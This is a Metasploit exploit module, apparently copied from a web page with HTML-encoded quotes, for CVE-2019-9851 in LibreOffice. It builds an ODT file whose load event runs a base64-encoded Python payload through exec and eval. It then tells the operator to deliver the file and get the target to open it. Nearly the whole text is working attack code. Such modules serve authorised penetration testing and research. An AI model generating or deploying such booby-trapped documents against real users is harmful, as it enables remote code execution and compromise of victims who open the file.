# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;LibreOffice Macro Python Code Execution&#039;,
      &#039;Description&#039;     => %q{
        LibreOffice comes bundled with sample macros written in Python and
        allows the ability to bind program events to them.

        LibreLogo is a macro that allows a program event to execute text as Python code, allowing RCE.

        This module generates an ODT file with a dom loaded event that,
        when triggered, will execute arbitrary python code and the metasploit payload.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Nils Emmerich&#039;,    # Vulnerability discovery and PoC
          &#039;Shelby Pace&#039;,      # Base module author (CVE-2018-16858), module reviewer and platform-independent code
          &#039;LoadLow&#039;,          # This msf module
          &#039;Gabriel Masei&#039;     # Global events vuln. disclosure
        ],
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2019-9851&#039; ],
          [ &#039;URL&#039;, &#039;https://www.libreoffice.org/about-us/security/advisories/cve-2019-9848/&#039; ],
          [ &#039;URL&#039;, &#039;https://www.libreoffice.org/about-us/security/advisories/cve-2019-9851/&#039; ],
        ],
      &#039;DisclosureDate&#039;  => &#039;2019-07-16&#039;,
      &#039;Platform&#039;        => &#039;python&#039;,
      &#039;Arch&#039;            => ARCH_PYTHON,
      &#039;Targets&#039;         => [ [&#039;Automatic&#039;, {}] ],
      &#039;DefaultTarget&#039;   =>  0
    ))

    register_options(
    [
      OptString.new(&#039;FILENAME&#039;, [true, &#039;Output file name&#039;, &#039;librefile.odt&#039;]),
      OptString.new(&#039;TEXT_CONTENT&#039;, [true, &#039;Text written in the document. It will be html encoded.&#039;, &#039;My Report&#039;]),
    ])
  end

  def gen_file
    text_content = Rex::Text.html_encode(datastore[&#039;TEXT_CONTENT&#039;])
    py_code = Rex::Text.encode_base64(payload.encoded)
    @cmd = "exec(eval(str(__import__(&#039;base64&#039;).b64decode(&#039;#{py_code}&#039;))))"
    @cmd = Rex::Text.html_encode(@cmd)

    fodt_file = File.read(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2019-9848&#039;, &#039;librefile.erb&#039;))
    libre_file = ERB.new(fodt_file).result(binding())

    print_status("File generated! Now you need to move the odt file and find a way to send it/open it with LibreOffice on the target.")

    libre_file
  rescue Errno::ENOENT
    fail_with(Failure::NotFound, &#039;Cannot find template file&#039;)
  end

  def exploit
    fodt_file = gen_file

    file_create(fodt_file)
  end
end

